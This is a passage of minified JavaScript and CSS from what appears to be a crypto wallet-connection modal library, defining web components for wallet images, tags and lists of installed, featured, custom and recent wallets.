    color: var(--local-color);
  }

  .wui-line-clamp-1 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }

  .wui-line-clamp-2 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 2;
  }

  .wui-font-medium-400 {
    font-size: var(--wui-font-size-medium);
    font-weight: var(--wui-font-weight-light);
    letter-spacing: var(--wui-letter-spacing-medium);
  }

  .wui-font-medium-600 {
    font-size: var(--wui-font-size-medium);
    letter-spacing: var(--wui-letter-spacing-medium);
  }

  .wui-font-title-600 {
    font-size: var(--wui-font-size-title);
    letter-spacing: var(--wui-letter-spacing-title);
  }

  .wui-font-title-6-600 {
    font-size: var(--wui-font-size-title-6);
    letter-spacing: var(--wui-letter-spacing-title-6);
  }

  .wui-font-mini-700 {
    font-size: var(--wui-font-size-mini);
    letter-spacing: var(--wui-letter-spacing-mini);
    text-transform: uppercase;
  }

  .wui-font-large-500,
  .wui-font-large-600,
  .wui-font-large-700 {
    font-size: var(--wui-font-size-large);
    letter-spacing: var(--wui-letter-spacing-large);
  }

  .wui-font-2xl-500,
  .wui-font-2xl-600,
  .wui-font-2xl-700 {
    font-size: var(--wui-font-size-2xl);
    letter-spacing: var(--wui-letter-spacing-2xl);
  }

  .wui-font-paragraph-400,
  .wui-font-paragraph-500,
  .wui-font-paragraph-600,
  .wui-font-paragraph-700 {
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
  }

  .wui-font-small-400,
  .wui-font-small-500,
  .wui-font-small-600 {
    font-size: var(--wui-font-size-small);
    letter-spacing: var(--wui-letter-spacing-small);
  }

  .wui-font-tiny-400,
  .wui-font-tiny-500,
  .wui-font-tiny-600 {
    font-size: var(--wui-font-size-tiny);
    letter-spacing: var(--wui-letter-spacing-tiny);
  }

  .wui-font-micro-700,
  .wui-font-micro-600 {
    font-size: var(--wui-font-size-micro);
    letter-spacing: var(--wui-letter-spacing-micro);
    text-transform: uppercase;
  }

  .wui-font-tiny-400,
  .wui-font-small-400,
  .wui-font-medium-400,
  .wui-font-paragraph-400 {
    font-weight: var(--wui-font-weight-light);
  }

  .wui-font-large-700,
  .wui-font-paragraph-700,
  .wui-font-micro-700,
  .wui-font-mini-700 {
    font-weight: var(--wui-font-weight-bold);
  }

  .wui-font-medium-600,
  .wui-font-medium-title-600,
  .wui-font-title-6-600,
  .wui-font-large-600,
  .wui-font-paragraph-600,
  .wui-font-small-600,
  .wui-font-tiny-600,
  .wui-font-micro-600 {
    font-weight: var(--wui-font-weight-medium);
  }

  :host([disabled]) {
    opacity: 0.4;
  }
`;var d6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Mg=class extends he{constructor(){super(...arguments),this.variant="paragraph-500",this.color="fg-300",this.align="left",this.lineClamp=void 0}render(){const e={[`wui-font-${this.variant}`]:!0,[`wui-color-${this.color}`]:!0,[`wui-line-clamp-${this.lineClamp}`]:!!this.lineClamp};return this.style.cssText=`
      --local-align: ${this.align};
      --local-color: var(--wui-color-${this.color});
    `,F`<slot class=${Ow(e)}></slot>`}};Mg.styles=[Ii,oht];d6([V()],Mg.prototype,"variant",void 0);d6([V()],Mg.prototype,"color",void 0);d6([V()],Mg.prototype,"align",void 0);d6([V()],Mg.prototype,"lineClamp",void 0);Mg=d6([Ot("wui-text")],Mg);const aht=ge`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    position: relative;
    overflow: hidden;
    background-color: var(--wui-color-gray-glass-020);
    border-radius: var(--local-border-radius);
    border: var(--local-border);
    box-sizing: content-box;
    width: var(--local-size);
    height: var(--local-size);
    min-height: var(--local-size);
    min-width: var(--local-size);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host {
      background-color: color-mix(in srgb, var(--local-bg-value) var(--local-bg-mix), transparent);
    }
  }
`;var U0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Eu=class extends he{constructor(){super(...arguments),this.size="md",this.backgroundColor="accent-100",this.iconColor="accent-100",this.background="transparent",this.border=!1,this.borderColor="wui-color-bg-125",this.icon="copy"}render(){const e=this.iconSize||this.size,t=this.size==="lg",i=this.size==="xl",n=t?"12%":"16%",s=t?"xxs":i?"s":"3xl",o=this.background==="gray",a=this.background==="opaque",c=this.backgroundColor==="accent-100"&&a||this.backgroundColor==="success-100"&&a||this.backgroundColor==="error-100"&&a||this.backgroundColor==="inverse-100"&&a;let l=`var(--wui-color-${this.backgroundColor})`;return c?l=`var(--wui-icon-box-bg-${this.backgroundColor})`:o&&(l=`var(--wui-color-gray-${this.backgroundColor})`),this.style.cssText=`
       --local-bg-value: ${l};
       --local-bg-mix: ${c||o?"100%":n};
       --local-border-radius: var(--wui-border-radius-${s});
       --local-size: var(--wui-icon-box-size-${this.size});
       --local-border: ${this.borderColor==="wui-color-bg-125"?"2px":"1px"} solid ${this.border?`var(--${this.borderColor})`:"transparent"}
   `,F` <wui-icon color=${this.iconColor} size=${e} name=${this.icon}></wui-icon> `}};Eu.styles=[Ii,vo,aht];U0([V()],Eu.prototype,"size",void 0);U0([V()],Eu.prototype,"backgroundColor",void 0);U0([V()],Eu.prototype,"iconColor",void 0);U0([V()],Eu.prototype,"iconSize",void 0);U0([V()],Eu.prototype,"background",void 0);U0([V({type:Boolean})],Eu.prototype,"border",void 0);U0([V()],Eu.prototype,"borderColor",void 0);U0([V()],Eu.prototype,"icon",void 0);Eu=U0([Ot("wui-icon-box")],Eu);const cht=ge`
  :host {
    display: block;
    width: var(--local-width);
    height: var(--local-height);
  }

  img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    border-radius: inherit;
  }
`;var SE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let h3=class extends he{constructor(){super(...arguments),this.src="./path/to/image.jpg",this.alt="Image",this.size=void 0}render(){return this.style.cssText=`
      --local-width: ${this.size?`var(--wui-icon-size-${this.size});`:"100%"};
      --local-height: ${this.size?`var(--wui-icon-size-${this.size});`:"100%"};
      `,F`<img src=${this.src} alt=${this.alt} @error=${this.handleImageError} />`}handleImageError(){this.dispatchEvent(new CustomEvent("onLoadError",{bubbles:!0,composed:!0}))}};h3.styles=[Ii,c6,cht];SE([V()],h3.prototype,"src",void 0);SE([V()],h3.prototype,"alt",void 0);SE([V()],h3.prototype,"size",void 0);h3=SE([Ot("wui-image")],h3);const lht=ge`
  :host {
    position: relative;
    background-color: var(--wui-color-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-size);
    height: var(--local-size);
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host > wui-flex {
    overflow: hidden;
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  :host([name='Extension'])::after {
    border: 1px solid var(--wui-color-accent-glass-010);
  }

  :host([data-wallet-icon='allWallets']) {
    background-color: var(--wui-all-wallets-bg-100);
  }

  :host([data-wallet-icon='allWallets'])::after {
    border: 1px solid var(--wui-color-accent-glass-010);
  }

  wui-icon[data-parent-size='inherit'] {
    width: 75%;
    height: 75%;
    align-items: center;
  }

  wui-icon[data-parent-size='sm'] {
    width: 18px;
    height: 18px;
  }

  wui-icon[data-parent-size='md'] {
    width: 24px;
    height: 24px;
  }

  wui-icon[data-parent-size='lg'] {
    width: 42px;
    height: 42px;
  }

  wui-icon[data-parent-size='full'] {
    width: 100%;
    height: 100%;
  }

  :host > wui-icon-box {
    position: absolute;
    overflow: hidden;
    right: -1px;
    bottom: -2px;
    z-index: 1;
    border: 2px solid var(--wui-color-bg-150, #1e1f1f);
    padding: 1px;
  }
`;var T2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let C0=class extends he{constructor(){super(...arguments),this.size="md",this.name="",this.installed=!1,this.badgeSize="xs"}render(){let e="xxs";return this.size==="lg"?e="m":this.size==="md"?e="xs":e="xxs",this.style.cssText=`
       --local-border-radius: var(--wui-border-radius-${e});
       --local-size: var(--wui-wallet-image-size-${this.size});
   `,this.walletIcon&&(this.dataset.walletIcon=this.walletIcon),F`
      <wui-flex justifyContent="center" alignItems="center"> ${this.templateVisual()} </wui-flex>
    `}templateVisual(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:this.walletIcon?F`<wui-icon
        data-parent-size="md"
        size="md"
        color="inherit"
        name=${this.walletIcon}
      ></wui-icon>`:F`<wui-icon
      data-parent-size=${this.size}
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};C0.styles=[vo,Ii,lht];T2([V()],C0.prototype,"size",void 0);T2([V()],C0.prototype,"name",void 0);T2([V()],C0.prototype,"imageSrc",void 0);T2([V()],C0.prototype,"walletIcon",void 0);T2([V({type:Boolean})],C0.prototype,"installed",void 0);T2([V()],C0.prototype,"badgeSize",void 0);C0=T2([Ot("wui-wallet-image")],C0);const uht=ge`
  :host {
    position: relative;
    border-radius: var(--wui-border-radius-xxs);
    width: 40px;
    height: 40px;
    overflow: hidden;
    background: var(--wui-color-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: var(--wui-spacing-4xs);
    padding: 3.75px !important;
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  :host > wui-wallet-image {
    width: 14px;
    height: 14px;
    border-radius: var(--wui-border-radius-5xs);
  }

  :host > wui-flex {
    padding: 2px;
    position: fixed;
    overflow: hidden;
    left: 34px;
    bottom: 8px;
    background: var(--dark-background-150, #1e1f1f);
    border-radius: 50%;
    z-index: 2;
    display: flex;
  }
`;var rae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const LT=4;let hx=class extends he{constructor(){super(...arguments),this.walletImages=[]}render(){const e=this.walletImages.length<LT;return F`${this.walletImages.slice(0,LT).map(({src:t,walletName:i})=>F`
            <wui-wallet-image
              size="inherit"
              imageSrc=${t}
              name=${ye(i)}
            ></wui-wallet-image>
          `)}
      ${e?[...Array(LT-this.walletImages.length)].map(()=>F` <wui-wallet-image size="inherit" name=""></wui-wallet-image>`):null}
      <wui-flex>
        <wui-icon-box
          size="xxs"
          iconSize="xxs"
          iconcolor="success-100"
          backgroundcolor="success-100"
          icon="checkmark"
          background="opaque"
        ></wui-icon-box>
      </wui-flex>`}};hx.styles=[Ii,uht];rae([V({type:Array})],hx.prototype,"walletImages",void 0);hx=rae([Ot("wui-all-wallets-image")],hx);const dht=ge`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    height: var(--wui-spacing-m);
    padding: 0 var(--wui-spacing-3xs) !important;
    border-radius: var(--wui-border-radius-5xs);
    transition:
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius, background-color;
  }

  :host > wui-text {
    transform: translateY(5%);
  }

  :host([data-variant='main']) {
    background-color: var(--wui-color-accent-glass-015);
    color: var(--wui-color-accent-100);
  }

  :host([data-variant='shade']) {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  :host([data-variant='success']) {
    background-color: var(--wui-icon-box-bg-success-100);
    color: var(--wui-color-success-100);
  }

  :host([data-variant='error']) {
    background-color: var(--wui-icon-box-bg-error-100);
    color: var(--wui-color-error-100);
  }

  :host([data-size='lg']) {
    padding: 11px 5px !important;
  }

  :host([data-size='lg']) > wui-text {
    transform: translateY(2%);
  }
`;var _B=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ly=class extends he{constructor(){super(...arguments),this.variant="main",this.size="lg"}render(){this.dataset.variant=this.variant,this.dataset.size=this.size;const e=this.size==="md"?"mini-700":"micro-700";return F`
      <wui-text data-variant=${this.variant} variant=${e} color="inherit">
        <slot></slot>
      </wui-text>
    `}};Ly.styles=[Ii,dht];_B([V()],Ly.prototype,"variant",void 0);_B([V()],Ly.prototype,"size",void 0);Ly=_B([Ot("wui-tag")],Ly);const hht=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
  }

  button > wui-text:nth-child(2) {
    display: flex;
    flex: 1;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-015);
    color: var(--wui-color-gray-glass-015);
  }

  button:disabled > wui-tag {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-300);
  }

  wui-icon {
    color: var(--wui-color-fg-200) !important;
  }
`;var za=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let jo=class extends he{constructor(){super(...arguments),this.walletImages=[],this.imageSrc="",this.name="",this.tabIdx=void 0,this.installed=!1,this.disabled=!1,this.showAllWallets=!1,this.loading=!1,this.loadingSpinnerColor="accent-100"}render(){return F`
      <button ?disabled=${this.disabled} tabindex=${ye(this.tabIdx)}>
        ${this.templateAllWallets()} ${this.templateWalletImage()}
        <wui-text variant="paragraph-500" color="inherit">${this.name}</wui-text>
        ${this.templateStatus()}
      </button>
    `}templateAllWallets(){return this.showAllWallets&&this.imageSrc?F` <wui-all-wallets-image .imageeSrc=${this.imageSrc}> </wui-all-wallets-image> `:this.showAllWallets&&this.walletIcon?F` <wui-wallet-image .walletIcon=${this.walletIcon} size="sm"> </wui-wallet-image> `:null}templateWalletImage(){return!this.showAllWallets&&this.imageSrc?F`<wui-wallet-image
        size="sm"
        imageSrc=${this.imageSrc}
        name=${this.name}
        .installed=${this.installed}
      ></wui-wallet-image>`:!this.showAllWallets&&!this.imageSrc?F`<wui-wallet-image size="sm" name=${this.name}></wui-wallet-image>`:null}templateStatus(){return this.loading?F`<wui-loading-spinner
        size="lg"
        color=${this.loadingSpinnerColor}
      ></wui-loading-spinner>`:this.tagLabel&&this.tagVariant?F`<wui-tag variant=${this.tagVariant}>${this.tagLabel}</wui-tag>`:this.icon?F`<wui-icon color="inherit" size="sm" name=${this.icon}></wui-icon>`:null}};jo.styles=[Ii,vo,hht];za([V({type:Array})],jo.prototype,"walletImages",void 0);za([V()],jo.prototype,"imageSrc",void 0);za([V()],jo.prototype,"name",void 0);za([V()],jo.prototype,"tagLabel",void 0);za([V()],jo.prototype,"tagVariant",void 0);za([V()],jo.prototype,"icon",void 0);za([V()],jo.prototype,"walletIcon",void 0);za([V()],jo.prototype,"tabIdx",void 0);za([V({type:Boolean})],jo.prototype,"installed",void 0);za([V({type:Boolean})],jo.prototype,"disabled",void 0);za([V({type:Boolean})],jo.prototype,"showAllWallets",void 0);za([V({type:Boolean})],jo.prototype,"loading",void 0);za([V({type:String})],jo.prototype,"loadingSpinnerColor",void 0);jo=za([Ot("wui-list-wallet")],jo);var J3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Dg=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.count=rt.state.count,this.filteredCount=rt.state.filteredWallets.length,this.isFetchingRecommendedWallets=rt.state.isFetchingRecommendedWallets,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e),rt.subscribeKey("count",e=>this.count=e),rt.subscribeKey("filteredWallets",e=>this.filteredCount=e.length),rt.subscribeKey("isFetchingRecommendedWallets",e=>this.isFetchingRecommendedWallets=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.find(c=>c.id==="walletConnect"),{allWallets:t}=Be.state;if(!e||t==="HIDE"||t==="ONLY_MOBILE"&&!Ze.isMobile())return null;const i=rt.state.featured.length,n=this.count+i,s=n<10?n:Math.floor(n/10)*10,o=this.filteredCount>0?this.filteredCount:s;let a=`${o}`;return this.filteredCount>0?a=`${this.filteredCount}`:o<n&&(a=`${o}+`),F`
      <wui-list-wallet
        name="All Wallets"
        walletIcon="allWallets"
        showAllWallets
        @click=${this.onAllWallets.bind(this)}
        tagLabel=${a}
        tagVariant="shade"
        data-testid="all-wallets"
        tabIdx=${ye(this.tabIdx)}
        .loading=${this.isFetchingRecommendedWallets}
        loadingSpinnerColor=${this.isFetchingRecommendedWallets?"fg-300":"accent-100"}
      ></wui-list-wallet>
    `}onAllWallets(){Hr.sendEvent({type:"track",event:"CLICK_ALL_WALLETS"}),tt.push("AllWallets")}};J3([V()],Dg.prototype,"tabIdx",void 0);J3([te()],Dg.prototype,"connectors",void 0);J3([te()],Dg.prototype,"count",void 0);J3([te()],Dg.prototype,"filteredCount",void 0);J3([te()],Dg.prototype,"isFetchingRecommendedWallets",void 0);Dg=J3([Ot("w3m-all-wallets-widget")],Dg);var SB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let fx=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.filter(t=>t.type==="ANNOUNCED");return e?.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${e.filter(o0.showConnector).map(t=>F`
              <wui-list-wallet
                imageSrc=${ye(Es.getConnectorImage(t))}
                name=${t.name??"Unknown"}
                @click=${()=>this.onConnector(t)}
                tagVariant="success"
                tagLabel="installed"
                data-testid=${`wallet-selector-${t.id}`}
                .installed=${!0}
                tabIdx=${ye(this.tabIdx)}
              >
              </wui-list-wallet>
            `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(e){e.id==="walletConnect"?Ze.isMobile()?tt.push("AllWallets"):tt.push("ConnectingWalletConnect"):tt.push("ConnectingExternal",{connector:e})}};SB([V()],fx.prototype,"tabIdx",void 0);SB([te()],fx.prototype,"connectors",void 0);fx=SB([Ot("w3m-connect-announced-widget")],fx);var AE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Uy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.loading=!1,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e)),Ze.isTelegram()&&Ze.isIos()&&(this.loading=!ut.state.wcUri,this.unsubscribe.push(ut.subscribeKey("wcUri",e=>this.loading=!e)))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{customWallets:e}=Be.state;if(!e?.length)return this.style.cssText="display: none",null;const t=this.filterOutDuplicateWallets(e);return F`<wui-flex flexDirection="column" gap="xs">
      ${t.map(i=>F`
          <wui-list-wallet
            imageSrc=${ye(Es.getWalletImage(i))}
            name=${i.name??"Unknown"}
            @click=${()=>this.onConnectWallet(i)}
            data-testid=${`wallet-selector-${i.id}`}
            tabIdx=${ye(this.tabIdx)}
            ?loading=${this.loading}
          >
          </wui-list-wallet>
        `)}
    </wui-flex>`}filterOutDuplicateWallets(e){const t=Bt.getRecentWallets(),i=this.connectors.map(a=>a.info?.rdns).filter(Boolean),n=t.map(a=>a.rdns).filter(Boolean),s=i.concat(n);if(s.includes("io.metamask.mobile")&&Ze.isMobile()){const a=s.indexOf("io.metamask.mobile");s[a]="io.metamask"}return e.filter(a=>!s.includes(String(a?.rdns)))}onConnectWallet(e){this.loading||tt.push("ConnectingWalletConnect",{wallet:e})}};AE([V()],Uy.prototype,"tabIdx",void 0);AE([te()],Uy.prototype,"connectors",void 0);AE([te()],Uy.prototype,"loading",void 0);Uy=AE([Ot("w3m-connect-custom-widget")],Uy);var AB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let px=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const i=this.connectors.filter(n=>n.type==="EXTERNAL").filter(o0.showConnector).filter(n=>n.id!==Ht.CONNECTOR_ID.COINBASE_SDK);return i?.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${i.map(n=>F`
            <wui-list-wallet
              imageSrc=${ye(Es.getConnectorImage(n))}
              .installed=${!0}
              name=${n.name??"Unknown"}
              data-testid=${`wallet-selector-external-${n.id}`}
              @click=${()=>this.onConnector(n)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(e){tt.push("ConnectingExternal",{connector:e})}};AB([V()],px.prototype,"tabIdx",void 0);AB([te()],px.prototype,"connectors",void 0);px=AB([Ot("w3m-connect-external-widget")],px);var IB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let gx=class extends he{constructor(){super(...arguments),this.tabIdx=void 0,this.wallets=[]}render(){return this.wallets.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${this.wallets.map(e=>F`
            <wui-list-wallet
              data-testid=${`wallet-selector-featured-${e.id}`}
              imageSrc=${ye(Es.getWalletImage(e))}
              name=${e.name??"Unknown"}
              @click=${()=>this.onConnectWallet(e)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(e){We.selectWalletConnector(e)}};IB([V()],gx.prototype,"tabIdx",void 0);IB([V()],gx.prototype,"wallets",void 0);gx=IB([Ot("w3m-connect-featured-widget")],gx);var TB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let mx=class extends he{constructor(){super(...arguments),this.tabIdx=void 0,this.connectors=[]}render(){const e=this.connectors.filter(o0.showConnector);return e.length===0?(this.style.cssText="display: none",null):F`
      <wui-flex flexDirection="column" gap="xs">
        ${e.map(t=>F`
            <wui-list-wallet
              imageSrc=${ye(Es.getConnectorImage(t))}
              .installed=${!0}
              name=${t.name??"Unknown"}
              tagVariant="success"
              tagLabel="installed"
              data-testid=${`wallet-selector-${t.id}`}
              @click=${()=>this.onConnector(t)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `}onConnector(e){We.setActiveConnector(e),tt.push("ConnectingExternal",{connector:e})}};TB([V()],mx.prototype,"tabIdx",void 0);TB([V()],mx.prototype,"connectors",void 0);mx=TB([Ot("w3m-connect-injected-widget")],mx);var kB=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let wx=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.filter(t=>t.type==="MULTI_CHAIN"&&t.name!=="WalletConnect");return e?.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${e.map(t=>F`
            <wui-list-wallet
              imageSrc=${ye(Es.getConnectorImage(t))}
              .installed=${!0}
              name=${t.name??"Unknown"}
              tagVariant="shade"
              tagLabel="multichain"
              data-testid=${`wallet-selector-${t.id}`}
              @click=${()=>this.onConnector(t)}
              tabIdx=${ye(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(e){We.setActiveConnector(e),tt.push("ConnectingMultiChain")}};kB([V()],wx.prototype,"tabIdx",void 0);kB([te()],wx.prototype,"connectors",void 0);wx=kB([Ot("w3m-connect-multi-chain-widget")],wx);var IE=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let jy=class extends he{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=We.state.connectors,this.loading=!1,this.unsubscribe.push(We.subscribeKey("connectors",e=>this.connectors=e)),Ze.isTelegram()&&Ze.isIos()&&(this.loading=!ut.state.wcUri,this.unsubscribe.push(ut.subscribeKey("wcUri",e=>this.loading=!e)))}render(){const t=Bt.getRecentWallets().filter(i=>!Og.isExcluded(i)).filter(i=>!this.hasWalletConnector(i)).filter(i=>this.isWalletCompatibleWithCurrentChain(i));return t.length?F`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(i=>F`
            <wui-list-wallet
              imageSrc=${ye(Es.getWalletImage(i))}
              name=${i.name??"Unknown"}
              @click=${()=>this.onConnectWallet(i)}
              tagLabel="recent"
              tagVariant="shade"
              tabIdx=${ye(this.tabIdx)}
              ?loading=${this.loading}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
